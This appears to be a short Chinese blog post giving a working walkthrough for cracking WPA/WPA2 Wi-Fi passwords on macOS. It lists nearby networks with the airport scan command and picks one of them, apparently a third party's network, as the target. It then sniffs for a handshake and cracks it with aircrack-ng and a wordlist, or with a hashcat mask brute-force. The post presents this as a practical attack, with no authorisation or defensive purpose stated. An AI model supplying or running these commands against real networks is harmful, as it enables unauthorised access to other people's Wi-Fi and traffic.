---
layout:     post
title:      wifi crack in macOS
date:       2017-06-06
summary:    wifi crack in macOS
categories: web
tags:
 - wifi
 - crack
 - macOS
---

### 0x00 必读link

```
https://gist.github.com/victorreyesh/6532800
https://www.aircrack-ng.org/install.html
https://apple.stackexchange.com/questions/117843/equivalent-of-airodump-ng-for-max-os-x
```

### 0x01 airport

```
find / -name "airport"
airport -s
    root in ~ λ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
                                SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
                                zhen d8:c8:e9:02:74:08 -83  4       Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)
                           @Hos-WiFi 94:b4:0f:73:7a:72 -88  44,+1   Y  -- NONE
                   HHT_10_2_229_225_ ac:cf:23:8c:70:b8 -44  11      Y  TW WPA2(PSK/AES/AES)
                                 www 50:bd:5f:6e:3f:44 -68  11,-1   Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
                          ziroom-11F b8:f8:83:d8:4a:2b -40  6,-1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)   

(target=www)
airport en1 sniff 11(en1 is the wifi netcard)
wait...(find / -name "*.cap",/tmp/*.cap exists)
aircrack-ng -w ......./pass.txt -b 50:bd:5f:6e:3f:44 /tmp/*.cap
    或者将cap文件转成hashcat支持的格式再用hashcat破解:
    a.将https://github.com/hashcat/hashcat-utils/releases里面的cap2hccapx.bin放到kali64(vm)下运行得到hccapx文件,然后再运行:
    b.hashcat -a 3 -m 2500 output.hccapx ?d?d?d?d?d?d?d?d
```

### 0x02 Attention

```
1.aircrack-ng官网说airodump-ng和aireplay-ng在macOS不支持
    airodump-ng可以看到已经建立的wifi连接
    aireplay-ng可以主动攻击wifi,上面的airport en1 sniff 只能被动等待有人连接wifi
    ---detail...
    " Mind you, airodump-ng and aireplay-ng are linux only and will not work under OSX native, so for reinjecting
     and sniffing you will have to use other means.

     If you have an intel Mac check out the VMware Fusion option which is mentioned lower on this page." 

     也即，目前macOS sierra下只好较被动的用airport sniff命令较长时间以保证期间有handshake,不可主动攻击

2.KisMac2不支持macOS sierra,目前新版本的macOS只能用上面的airport的被动方法crack wifi,除非找到了airodump-ng和
aireplay-ng的替代品
```

